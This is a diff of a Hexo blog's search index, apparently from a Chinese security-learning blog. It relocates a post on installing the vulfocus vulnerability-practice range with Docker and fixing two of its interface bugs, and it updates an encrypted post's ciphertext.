-<h3 id="启动："><a href="#启动：" class="headerlink" title="启动："></a>启动：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock  -e VUL_IP&#x3D;xxx.xxx.xxx.xxx&quot; vulfocus&#x2F;vulfocus</span><br></pre></td></tr></table></figure>
-<p>因为内网使用，就不开邮箱权限了。</p>
-<p>贴上官网教程。</p>
-<p><img src="https://i.loli.net/2021/09/27/wjPb7LlG12ApcO4.png" alt="image-20210927200624470"></p>
-<h2 id="bug处理"><a href="#bug处理" class="headerlink" title="bug处理"></a>bug处理</h2><h3 id="1、服务器内部异常，请联系管理员"><a href="#1、服务器内部异常，请联系管理员" class="headerlink" title="1、服务器内部异常，请联系管理员"></a>1、服务器内部异常，请联系管理员</h3><p>巨大bug，在拉取镜像后，点击首页会报这个错误，解决方式为进入镜像管理，点击右上角一键同步，即可。</p>
-<h3 id="2、忘了长啥样，但是进去就得处理"><a href="#2、忘了长啥样，但是进去就得处理" class="headerlink" title="2、忘了长啥样，但是进去就得处理"></a>2、忘了长啥样，但是进去就得处理</h3><p>点击设置-系统设置，在分享一栏输入自己的github账号名。然后镜像没事别乱点分享，即可。</p>
-<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>靶场环境很大很大！之前随便下了10个靶场就占了将近10G的内存！合理分配好内存！</p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>vulfocus搭建</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>几道比赛中遇到的密码题</title>
     <url>/2021/05/09/%E5%87%A0%E9%81%93%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98/</url>
     <content><![CDATA[<h1 id="比赛中的Crypto题复现"><a href="#比赛中的Crypto题复现" class="headerlink" title="比赛中的Crypto题复现"></a>比赛中的Crypto题复现</h1><p>今年比赛中做到的一些高质量的密码题。</p>
@@ -969,6 +946,29 @@ a\,\,=\,\,tmp^{-1}\,\,mod\,\,n</script><p>后半部分的维吉尼亚还没有�
       </categories>
       <tags>
         <tag>比赛复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulfocus靶场搭建及bug处理</title>
+    <url>/2021/09/27/vulforce%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E5%8F%8Abug%E5%A4%84%E7%90%86/</url>
+    <content><![CDATA[<h1 id="vulfocus搭建"><a href="#vulfocus搭建" class="headerlink" title="vulfocus搭建"></a>vulfocus搭建</h1><p>想复现漏洞，但是漏洞复现需要大家一起交流一起学习，就想到搭一个漏洞复现靶场。</p>
+<span id="more"></span>
+<p>首先贴上<a href="https://fofapro.github.io/vulfocus/#/">官方链接</a>：</p>
+<p>推荐采用快速安装。自定义安装极其繁琐，把握不住。</p>
+<h2 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h2><h3 id="拉取镜像："><a href="#拉取镜像：" class="headerlink" title="拉取镜像："></a>拉取镜像：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus&#x2F;vulfocus:latest</span><br></pre></td></tr></table></figure>
+<h3 id="启动："><a href="#启动：" class="headerlink" title="启动："></a>启动：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock  -e VUL_IP&#x3D;xxx.xxx.xxx.xxx&quot; vulfocus&#x2F;vulfocus</span><br></pre></td></tr></table></figure>
+<p>因为内网使用，就不开邮箱权限了。</p>
+<p>贴上官网教程。</p>
+<p><img src="https://i.loli.net/2021/09/27/wjPb7LlG12ApcO4.png" alt="image-20210927200624470"></p>
+<h2 id="bug处理"><a href="#bug处理" class="headerlink" title="bug处理"></a>bug处理</h2><h3 id="1、服务器内部异常，请联系管理员"><a href="#1、服务器内部异常，请联系管理员" class="headerlink" title="1、服务器内部异常，请联系管理员"></a>1、服务器内部异常，请联系管理员</h3><p>巨大bug，在拉取镜像后，点击首页会报这个错误，解决方式为进入镜像管理，点击右上角一键同步，即可。</p>
+<h3 id="2、忘了长啥样，但是进去就得处理"><a href="#2、忘了长啥样，但是进去就得处理" class="headerlink" title="2、忘了长啥样，但是进去就得处理"></a>2、忘了长啥样，但是进去就得处理</h3><p>点击设置-系统设置，在分享一栏输入自己的github账号名。然后镜像没事别乱点分享，即可。</p>
+<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>靶场环境很大很大！之前随便下了10个靶场就占了将近10G的内存！合理分配好内存！</p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>vulfocus搭建</tag>
       </tags>
   </entry>
   <entry>
@@ -1461,7 +1461,7 @@ q\,\,=\,\,n\,\,\div \,\,\left( p^2q^2 \right)</script><p>看得出来出题人�
     <title>英语</title>
     <url>/2021/10/04/%E8%8B%B1%E8%AF%AD/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="41332e1546f25d71a10e03d7a46f274f2691b6673826d8d23ea4d20e41efa4cb">e883eb0c0ef12cb21bc8492f3ea73cfc58999bbdf44e5b93dee6d8e512d44c2e86b254abdafa78bfc9bc6a04d04c7af251f2c07e9e30128f3302c64efe802bed685601741b6fc3a8fac07de29f62a378ccecd58379c5adf4a247d9dc678d66ba3d8f5ec8b67fd97e6da3fed0c49d7e413a8fdc138e35b4d2640331c10e8e9bf259f276dda0c53414718a2abbcc163eb98fa0fad468d5e01dc959c398878c1e1df7eb308352d15b6d7fc1d5451dbc80798beda0846abf6b0a3b445e15c10e3caafa02e5802fd6bf67bc46845e5a89c7aba1526730558a007d9e0c823269dc0b19433991aa634a14383f1edfebbb3c0cb4b0173d09abcde8e085e8ef80734398624508be0c2d3209d6394896e9a7e8232b10c27ce8e3d24196c52009020b737bec6e11bf141866d61cda37e575d916acaacbf0f87d39c6e15944c5122f73e78bd3757ee7bd20afd87bb5036733dce414fe4598e2687403ad31c9053b0aab252df2f72b64e43eb7e7d0bd978e4725b656a262894d570fd05eac49f5500b080ae10979206d3caa5ed0dfee55cc1aa866e2db86c356dbe3ec37c5782b22bdbe1e10b9bd8539d2c17d890ce76288001b07ac381d5f11819dea91b586112d5dbe1cf0b0b2510f3ecf06fc7993e5c5580001bad6d36aefcc3d016c1472b978ad7324970e54d48b125fb52a30764572e258d4a9f8994c09657a521cbb1b619d0634ddba92635523b563cb9911f1c5666a45299b9c0d93e91c64af388f6b1571348242556dfa40ef57d955455e628c8f93d4f475c351bbc2e00b04c1a65ac0d69e83c46bde42959b469facd553e42ec6ff37cda32be270fd518fed9d7ee8e53a4656c12c71a36056c5c94d5a9ac0fad45ff980f64d7e11e7cea37053b0b6096e1f69e9883ff1ec07f5c368f898482c05f35216d8139b03ee2ebc2d10a9cc44d275d60e16c8791aa0ca05d84652effed69c62d058d3572068da3427f627e34cdeefb5c35451ae5f207c7d32afa99005d55672162ad9b108e87175fd5f2bfe3995ed721f17d9a78d98245840419dae00d6f8986842bd8a795ad4cb976df46d15da797203530887d97015b984f36686434c7b8911ec0152cffaf86b0a97f327ea22005b9a51c0356d5daa9c7c29ca28ce452b73f6d20b6645dd7baf0d5c4a937cfd09422a7848c6e6ea21e22cb44291562838a1f7d864b7b499d9c09f2e3b17de1d029fcee8d49aa81b64faa57025fabfc60208937406f90f180421473c119098cb65b8a445f693cf6cf83f0e5e3754b715baf686cc40514d6d365f4a21c3b0efd0e083d5509ad197e2bbb64900ef6016e96e7e01c92f3274668cbee5b6f0aa5f24e522e3e51a7195cf7c72f5c1ddbd204cf1a2323bd719f735a4a17f64f5ffe486722169e0d89f0e5758f1546539e28d0d46aedd1a8d086b0d49e4f071837c7050c22e7c1721fd1523f3d8c0a0f90c9e7c087818774e33fdb23ab9dba2e9050742acea5aa1adf1f71ef0796a3f0ac21b45318e808d46220e0ecf473daaf1ee378683507818d03f25548719e318bd1fe72f87d406d030acd2ed98d8b1a0cf11e1804274f889bd7e7fb3d38264f8c425a0169390499afb7616358fa1d6b1a73df5ad900d5012b333a8876b8e2174e47adf3c217dc913ef53b7577c1f73194381cfb99a3bcca126b1567c1fec55de2851e01da6bf1528ccb6cd67ff3fa2bbc3f9b82ac10cc80394ab90ce50ac6009aa4a53644ca288161d</script>
+  <script id="hbeData" type="hbeData" data-hmacdigest="e65a23d49047d2804ef1769a5a9fbcba1ce61f1838e1bfea05fb556e62c566ab">e883eb0c0ef12cb21bc8492f3ea73cfc58999bbdf44e5b93dee6d8e512d44c2e86b254abdafa78bfc9bc6a04d04c7af251f2c07e9e30128f3302c64efe802bed685601741b6fc3a8fac07de29f62a378ccecd58379c5adf4a247d9dc678d66ba3d8f5ec8b67fd97e6da3fed0c49d7e413a8fdc138e35b4d2640331c10e8e9bf259f276dda0c53414718a2abbcc163eb98fa0fad468d5e01dc959c398878c1e1df7eb308352d15b6d7fc1d5451dbc80798beda0846abf6b0a3b445e15c10e3caafa02e5802fd6bf67bc46845e5a89c7aba1526730558a007d9e0c823269dc0b19433991aa634a14383f1edfebbb3c0cb4b0173d09abcde8e085e8ef80734398624508be0c2d3209d6394896e9a7e8232b10c27ce8e3d24196c52009020b737bec6e11bf141866d61cda37e575d916acaacbf0f87d39c6e15944c5122f73e78bd3757ee7bd20afd87bb5036733dce414fe4598e2687403ad31c9053b0aab252df2f72b64e43eb7e7d0bd978e4725b656a262894d570fd05eac49f5500b080ae10979206d3caa5ed0dfee55cc1aa866e2db86c356dbe3ec37c5782b22bdbe1e10b9bd8539d2c17d890ce76288001b07ac381d5f11819dea91b586112d5dbe1cf0b0b2510f3ecf06fc7993e5c5580001bad6d36aefcc3d016c1472b978ad7324970e54d48b125fb52a30764572e258d4a9f8994c09657a521cbb1b619d0634ddba92635523b563cb9911f1c5666a45299b9c0d93e91c64af388f6b1571348242556dfa40ef57d955455e628c8f93d4f475c351bbc2e00b04c1a65ac0d69e83c46bde42959b469facd553e42ec6ff37cda32be270fd518fed9d7ee8e53a4656c12c71a36056c5c94d5a9ac0fad45ff980f64d7e11e7cea37053b0b6096e1f69e9883ff1ec07f5c368f898482c05f35216d8139b03ee2ebc2d10a9cc44d275d60e16c8791aa0ca05d84652effed69c62d058d3572068da3427f627e34cdeefb5c35451ae5f207c7d32afa99005d55672162ad9b108e87175fd5f2bfe3995ed721f17d9a78d98245840419dae00d6f8986842bd8a795ad4cb976df46d15da797203530887d97015b984f36686434c7b8911ec0152cffaf86b0a97f327ea22005b9a51c0356d5daa9c7c29ca28ce452b73f6d20b6645dd7baf0d5c4a937cfd09422a7848c6e6ea21e22cb44291562838a1f7d864b7b499d9c09f2e3b17de1d029fcee8d49aa81b64faa57025fabfc60208937406f90f180421473c119098cb65b8a445f693cf6cf83f0e5e3754b715baf686cc40514d6d365f4a21c3b0efd0e083d5509ad197e2bbb64900ef6016e96e7e01c92f3274668cbee5b6f0aa5f24e522e3e51a7195cf7c72f5c1ddbd204cf1a2323bd719f735a4a17f64f5ffe486722169e0d89f0e5758f1546539e28d0d46aedd1a8d086b0d49e4f071837c7050c22e7c1721fd1523f3d8c0a0f90c9e7c087818774e33fdb23ab9dba2e9050742acea5aa1adf1f71ef0796a3f0ac21b45318e808d46220e0ecf473daaf1ee378683507818d03f25548719e318bd1fe72f87d406d030acd2ed98d8b1a0cf11e1804274f889bd7e7fb3d38264f8c425a0169390499afb7616358fa1d6b1a73df5ad900d5012b333a8876b8e2174e47adf3c217dc913ef53b7577c1f73194381cfb99a3bcca126b1567c1fec55de2851e01da6bf1528ccb6cd67ff3fa2bbc3f9b82ac10cc803940de702d70d1c4dc58b7599af0c7e592db756d657b4e022578fbc5be28272903cf6b9a436c7889685db90f0cd48d96dc955d433b1aecccbf5dde3d0cdd41e876decb092c2926ebd58ea3a7910f6cb9864e8dfcafb1488806d6aabe5e80a6e2a78537fce9ced5f2ffa154886a58894f5aefde99665bcb4f1da72e0a39b350e86304f31cfbb89232b9958054643c016572251ba4f4725e971dbe06b310bc85247f3b9034c26eb8b4873df03be845a70e2409ce5588a0c5b6cba8d9bcf64509d45d6c17332b22e924aa768d2986638efba95e039602ec90d29a911689e61bd07b4f2b7e6dea3c2a74a3366064e28ba2414e62265d2ee4ab341a29b44b6a738f27e9f84ea8c336068eb754c4d5a13e57847623fd8095d3dc8bf269c7526836a1107d624b5834a7672f8f18d7db59eaf239cfd33c16eac59e686180ee36f864fcb6b177b27f4a592a29da21d98ff91cef89ca57b4112ca527083716e50fa01faffd6456a25b4ae69ac0ee0f1f6510e6fca5cd68645b54c5848996d7f539e730a657c9732da0cddd357e490f3e1fa09e0b5e259c5d90ea33ce9b4f9570f7ecd91c3d28259e08ece1bed346c258ab6e4375c2cf3</script>
   <div class="hbe hbe-content">
     <div class="hbe hbe-input hbe-input-default">
       <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
